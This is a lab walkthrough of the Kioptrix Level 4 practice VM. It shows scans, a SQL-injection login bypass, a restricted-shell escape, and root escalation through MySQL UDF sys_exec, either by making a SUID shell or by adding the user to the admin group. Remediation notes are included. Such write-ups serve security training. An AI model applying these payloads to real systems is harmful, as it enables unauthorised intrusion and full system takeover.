**Vulnerable System**: Kioptrix 1.3 (Level 4)
=============================================

**Operating System**: Ubuntu 8.04

**Kernel**: 2.6.24

**Vulnerability Exploited**: SQL Injection (password)

**Exploit Used**: N/A

**Proof of Concept Code**: ' or 1='1

**Vulnerability Explained**: Web application’s login page had a field (password)
vulnerable to SQL injection. Upon exploiting this vulnerability access was
granted to Member’s Control Panel and 2 users’ credentials were obtained from
the web application.

**Vulnerability fix**: When making a login page that connects to MySQL database,
either use dynamic queries or make sure that user's input is validated.

**Severity**: **Medium**

**Privilege Escalation Vulnerability**: MySQL server with no password protection
and MySQL User Defined Functions (UDF)

**Exploit Used**: N/A

**Proof of Concept Code**: select sys_exec('usermod -a -G admin robert');

**Privilege Escalation Vulnerability Explained:** Due to MySQL database’s root
user having no password, the database is easily accessible. The database also
has User Defined Functions capabilities along with having administrative
privileges. User Defined Functions allows for system commands to be executed
from within the database. Therefore, since the database is running as root, the
commands are executed with administrative privileges.

**Vulnerability fix**: MySQL database should be protected with a strong
password. The password should not be present in any configuration files in
plaintext form. MySQL database should be ran under a limited privilege user such
as mysql instead of being ran as root.

**Severity**: **High**

Methodology
-----------

-   Host Discovery (netdiscover)

-   Port Scanning (nmap)

-   Web Port Enumeration (nikto, gobuster, browser)

-   Discovered MySQL injection (browser)

-   Low Privilege Shell Gained (SSH)

-   Privilege Escalation Enumeration (ps aux \| grep root \| grep -v ])

-   Discovered Appropriate Exploit (MySQL UDF Local Privilege Escalation)

-   Added User to Administrative Group to Gain Administrative Privileges)

Reconnaissance
--------------

### Netdiscover

Discovering the vulnerable system with netdiscover
```bash
netdiscover -r 192.168.211.0/24

Currently scanning: Finished! \| Screen View: Unique Hosts

3 Captured ARP Req/Rep packets, from 3 hosts. Total size: 180

_____________________________________________________________________________

IP At MAC Address Count Len MAC Vendor / Hostname

-----------------------------------------------------------------------------

192.168.211.1 00:50:56:c0:00:01 1 60 VMware, Inc.

192.168.211.129 00:0c:29:09:78:87 1 60 VMware, Inc.

192.168.211.254 00:50:56:e9:22:18 1 60 VMware, Inc.
```
### Nmap

Nmap all ports scan:

```bash
root@kali:~# nmap -p- 192.168.211.129

Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-03 23:45 EDT

Nmap scan report for 192.168.211.129

Host is up (0.00067s latency).

Not shown: 39528 closed ports, 26003 filtered ports

PORT STATE SERVICE

22/tcp open ssh

80/tcp open http

139/tcp open netbios-ssn

445/tcp open microsoft-ds

MAC Address: 00:0C:29:09:78:87 (VMware)
```

Nmap version and default script scan:

```bash
root@kali:~# nmap -sV -sC -A -p 22,80,139,445 192.168.211.129

Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-03 23:46 EDT

Nmap scan report for 192.168.211.129

Host is up (0.00071s latency).

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)

| ssh-hostkey:

| 1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)

|_ 2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)

80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with
Suhosin-Patch)

|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with
Suhosin-Patch

|_http-title: Site doesn't have a title (text/html).

139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)

MAC Address: 00:0C:29:09:78:87 (VMware)

Warning: OSScan results may be unreliable because we could not find at least 1
open and 1 closed port

Device type: general purpose

Running: Linux 2.6.X

OS CPE: cpe:/o:linux:linux_kernel:2.6

OS details: Linux 2.6.9 - 2.6.33

Network Distance: 1 hop

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:

|_clock-skew: mean: -2h00m00s, deviation: 2h49m42s, median: -4h00m00s

|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: \<unknown\>, NetBIOS MAC:<unknown> (unknown)

| smb-os-discovery:

| OS: Unix (Samba 3.0.28a)

| Computer name: Kioptrix4

| NetBIOS computer name:

| Domain name: localdomain

| FQDN: Kioptrix4.localdomain

|_ System time: 2019-09-03T19:47:05-04:00

| smb-security-mode:

| account_used: guest

| authentication_level: user

| challenge_response: supported

|\_ message_signing: disabled (dangerous, but default)

|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE

HOP RTT ADDRESS

1 0.71 ms 192.168.211.129
```

### Enum4linux

Enumerating Samba components with enum4linux (grep was used to get cleaner output)
```bash
root@kali:~# enum4linux 192.168.211.129 | grep -v unknown
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep  3 23:49:08 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.211.129
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================= 
|    Enumerating Workgroup/Domain on 192.168.211.129    |
 ======================================================= 
[+] Got domain/workgroup name: WORKGROUP

 =============================================== 
|    Nbtstat Information for 192.168.211.129    |
 =============================================== 
Looking up status of 192.168.211.129
	KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service
	KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service
	KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

	MAC Address = 00-00-00-00-00-00

 ======================================== 
|    Session Check on 192.168.211.129    |
 ======================================== 
[+] Server 192.168.211.129 allows sessions using username '', password ''

 ============================================== 
|    Getting domain SID for 192.168.211.129    |
 ============================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ========================================= 
|    OS information on 192.168.211.129    |
 ========================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.211.129 from smbclient: 
[+] Got OS info for 192.168.211.129 from srvinfo:
	KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	4.9
	server type     :	0x809a03

 ================================ 
|    Users on 192.168.211.129    |
 ================================ 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

 ============================================ 
|    Share Enumeration on 192.168.211.129    |
 ============================================ 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            KIOPTRIX4

[+] Attempting to map shares on 192.168.211.129
//192.168.211.129/print$	Mapping: DENIED, Listing: N/A
//192.168.211.129/IPC$	[E] Can't understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*

 ======================================================= 
|    Password Policy Information for 192.168.211.129    |
 ======================================================= 


[+] Attaching to 192.168.211.129 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] KIOPTRIX4
	[+] Builtin

[+] Password Info for Domain: KIOPTRIX4

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0


 ================================= 
|    Groups on 192.168.211.129    |
 ================================= 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================== 
|    Users on 192.168.211.129 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================== 
[I] Found new SID: S-1-5-21-2529228035-991147148-3991031631
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username '', password ''
S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\nobody (Local User)
S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\None (Domain Group)
S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\root (Local User)

 ================================================ 
|    Getting printer info for 192.168.211.129    |
 ================================================ 
No printers returned.

enum4linux complete on Tue Sep  3 23:49:35 2019
```

The scan above provided 3 usernames: john, robert and loneferret

### Web Port Enumeration

#### Nikto
```bash
root@kali:~# nikto -h 192.168.211.129
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.211.129
+ Target Hostname:    192.168.211.129
+ Target Port:        80
+ Start Time:         2019-09-03 23:51:08 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 98933, size: 5108, mtime: Tue Aug 28 06:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ Cookie PHPSESSID created without the httponly flag
+ 8724 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2019-09-03 23:51:45 (GMT-4) (37 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
#### GoBuster

Discovering hidden web directories with GoBuster:

```bash
root@kali:~# gobuster dir -u 192.168.211.129 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.211.129
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/03 23:54:23 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/images (Status: 301)
/index (Status: 200)
/index.php (Status: 200)
/john (Status: 301)
/logout (Status: 302)
/member (Status: 302)
/server-status (Status: 403)
===============================================================
2019/09/03 23:54:25 Finished
===============================================================
```

#### Browser

Using the browser to enumerate webpage and discovering Member Login page.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%204/Images/login.png?raw=true)

Low Privilege Exploitation
--------------------------

### SQL Injection
Using usernames discovered with enum4linux, password field can be injected with the following code: ```' or 1='1```

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%204/Images/sqlinjection.png?raw=true)

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%204/Images/sqlinjection1.png?raw=true)

### SSH

With credentials obtained from Member’s Control Panel, SSH can be used to get low privilege shell to the system.
```bash
ssh robert@192.168.211.129

robert@192.168.211.129's password:

Welcome to LigGoat Security Systems - We are Watching

== Welcome LigGoat Employee ==

LigGoat Shell is in place so you don't screw up

Type '?' or 'help' to get the list of allowed commands

robert:\~\$ ?

cd clear echo exit help ll lpath ls
```
#### Escaping the Shell

As the low privilige shell is very restrictive echo command can be used to obtain a non-restrictive shell.
```bash
robert:\~\$ echo os.system('/bin/bash')
```
Privilege Escalation Enumeration
--------------------------------

### Determining what services are running on the system.

Below service running with root priviliges are displayed.

```bash
robert@Kioptrix4:/$ ps aux | grep root | grep -v ]
root         1  0.0  0.1   2844  1692 ?        Ss   19:40   0:02 /sbin/init
root      2875  0.0  0.0   2236   728 ?        S<s  19:41   0:00 /sbin/udevd --daemon
root      4643  0.0  0.0   1716   488 tty4     Ss+  19:41   0:00 /sbin/getty 38400 tty4
root      4645  0.0  0.0   1716   492 tty5     Ss+  19:41   0:00 /sbin/getty 38400 tty5
root      4652  0.0  0.0   1716   492 tty2     Ss+  19:41   0:00 /sbin/getty 38400 tty2
root      4655  0.0  0.0   1716   492 tty3     Ss+  19:41   0:00 /sbin/getty 38400 tty3
root      4659  0.0  0.0   1716   492 tty6     Ss+  19:41   0:00 /sbin/getty 38400 tty6
root      4711  0.0  0.0   1872   544 ?        S    19:41   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
root      4732  0.0  0.0   5316   992 ?        Ss   19:41   0:00 /usr/sbin/sshd
root      4788  0.0  0.0   1772   524 ?        S    19:41   0:00 /bin/sh /usr/bin/mysqld_safe
root      4830  0.0  1.7 127224 17608 ?        Sl   19:41   0:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/ru
root      4832  0.0  0.0   1700   552 ?        S    19:41   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
root      4905  0.0  0.1   6528  1332 ?        Ss   19:41   0:00 /usr/sbin/nmbd -D
root      4907  0.0  0.2  10108  2544 ?        Ss   19:41   0:00 /usr/sbin/smbd -D
root      4921  0.0  0.0  10108  1028 ?        S    19:41   0:00 /usr/sbin/smbd -D
root      4922  0.0  0.1   8084  1340 ?        Ss   19:41   0:00 /usr/sbin/winbindd
root      4926  0.0  0.1   8208  1704 ?        S    19:41   0:00 /usr/sbin/winbindd
root      4954  0.0  0.0   2104   888 ?        Ss   19:41   0:00 /usr/sbin/cron
root      4976  0.0  0.5  20464  6200 ?        Ss   19:41   0:00 /usr/sbin/apache2 -k start
root      5031  0.0  0.0   1716   492 tty1     Ss+  19:41   0:00 /sbin/getty 38400 tty1
root      5050  0.0  0.0   8084   868 ?        S    19:47   0:00 /usr/sbin/winbindd
root      5051  0.0  0.1   8092  1264 ?        S    19:47   0:00 /usr/sbin/winbindd
robert    8762  0.0  0.0   3004   752 pts/2    R+   22:21   0:00 grep root
```

From the above output it was determined that MySQL server is running with administrative privileges.

### Searching for MySQL password:

Next we can attempt to gain access to MySQL database by searching for a script containing mysql password. Often these files are located in web directory on the server.

```bash
robert@Kioptrix4:/$ cd /var/www/

robert@Kioptrix4:/var/www$ grep -rl "password" *
checklogin.php
database.sql
index.php
john/john.php
robert/robert.php

robert@Kioptrix4:/var/www$ cat checklogin.php 
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
```

MySql credentials were found in checklogin.php file located in /var/www directory.

Vulnerability Identification
----------------------------

### Searchsploit

Using searchsploit to looking for appropriate exploit in exploit-db. It seems like User-Defined Functions is an appropriate vulnerability. 
```bash
root@kali:/opt/LinEnum# searchsploit MySQL Privilege Escalation
--------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                               |  Path
                                                                                             | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------- ----------------------------------------
MySQL (Linux) - Database Privilege Escalation                                                | exploits/linux/local/23077.pl
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege Escalation     | exploits/linux/local/40360.txt
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / R | exploits/linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation      | exploits/linux/local/40679.sh
MySQL 3.23.x - 'mysqld' Local Privilege Escalation                                           | exploits/linux/local/22340.txt
MySQL 4.x - CREATE Temporary TABLE Symlink Privilege Escalation                              | exploits/multiple/remote/25211.c
MySQL User-Defined (Linux) (x32/x86_64) - 'sys_exec' Local Privilege Escalation              | exploits/linux/local/46249.py
Oracle MySQL < 5.1.50 - Privilege Escalation                                                 | exploits/multiple/remote/34796.txt
cPanel 10.8.x - 'cpwrap' via MySQLAdmin Privilege Escalation (PHP)                           | exploits/php/webapps/2554.php
cPanel 10.8.x - cpwrap via MySQLAdmin Privilege Escalation                                   | exploits/linux/local/2466.pl
--------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

Determining path to the exploit and copying it to the clipboard.
```bash
root@kali:~/vulnhub/kioptrix4# searchsploit -p 46249
  Exploit: MySQL User-Defined (Linux) (x32/x86_64) - 'sys_exec' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46249
     Path: /usr/share/exploitdb/exploits/linux/local/46249.py
File Type: ASCII text, with very long lines, with CRLF line terminators

Copied EDB-ID #46249's path to the clipboard.
```

From the script found above, it seems like the exploit is trying to create a SUID binary:

```python
os.system('mysql -u root -p\'' + password + '\' -e "select sys_exec(\'cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\')"')
```

### SimpleHTTPServer

Next the exploit needs to be transfered to the vicitms machine.
Serving exploit using Python’s SimpleHTTP server:
```bash
root@kali:~/vulnhub/kioptrix4# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.211.129 - - [04/Sep/2019 13:08:28] "GET /46249.py HTTP/1.0" 200 –
```

Downloading the exploit to victim’s machine:
```bash
robert@Kioptrix4:/tmp$ wget 192.168.211.130:8000/46249.py
--22:30:57--  http://192.168.211.130:8000/46249.py
           => `46249.py'
Connecting to 192.168.211.130:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31,215 (30K) [text/plain]

100%[==========================>] 31,215        --.--K/s             

22:30:57 (146.56 MB/s) - `46249.py' saved [31215/31215]
```

Privilege Escalation
--------------------

Running the exploit.
```bash
robert\@Kioptrix4:/tmp\$ python 46249.py

Traceback (most recent call last):

File "46249.py", line 35, in \<module\>

import argparse

ImportError: No module named argparse
```

Above python script did not work due to argparse module not being present on the
system, next a manual attempt will be performed.

After reading about the vulnerability in the article below, it seems like
lib_mysqludf_sys needs to be present in order to exploit the vulnerability:

<https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html>

Searching for the library:
```bash
robert@Kioptrix4:/tmp$ find / -name lib_mysqludf_sys* 2>/dev/null
/usr/lib/lib_mysqludf_sys.so
```

After searching for the library, it is confirmed that it's present on the
system.

Next, MySQL authentication should be performed:

```bash
robert@Kioptrix4:/tmp$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 17267
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
```

Privilege Escalation can be done in several ways.

As per the python script above, once MySQL authentication is performed, the same command can be executed manually in MySQL. As can be seen below the SUID binary was created and when executed access to root account has been granted.

```bash
mysql> select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
    -> ;
+-------------------------------------------------------------------------+
| sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh') |
+-------------------------------------------------------------------------+
| NULL                                                                    | 
+-------------------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> exit
Bye
robert@Kioptrix4:~$ cd /tmp/
robert@Kioptrix4:/tmp$ ls
46249.py  LinEnum.sh  sh
robert@Kioptrix4:/tmp$ ./sh
# whoami
root
```

Second way is to add the user (robert) to administrative group.

```bash
mysql> select sys_exec('usermod -a -G admin robert');
+----------------------------------------+
| sys_exec('usermod -a -G admin robert') |
+----------------------------------------+
| NULL                                   | 
+----------------------------------------+
1 row in set (0.04 sec)
mysql> exit
Bye
```

User Robert has now been added to administrative group. Now the switch can be made to
root user from Robert’s account as shown below:

```bash
robert@Kioptrix4:/tmp$ sudo su
[sudo] password for robert: 
root@Kioptrix4:/tmp# whoami
root
```

Lastly, the root flag has been obtained:

```bash
root@Kioptrix4:/tmp# cd /root
root@Kioptrix4:~# cat congrats.txt 
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```
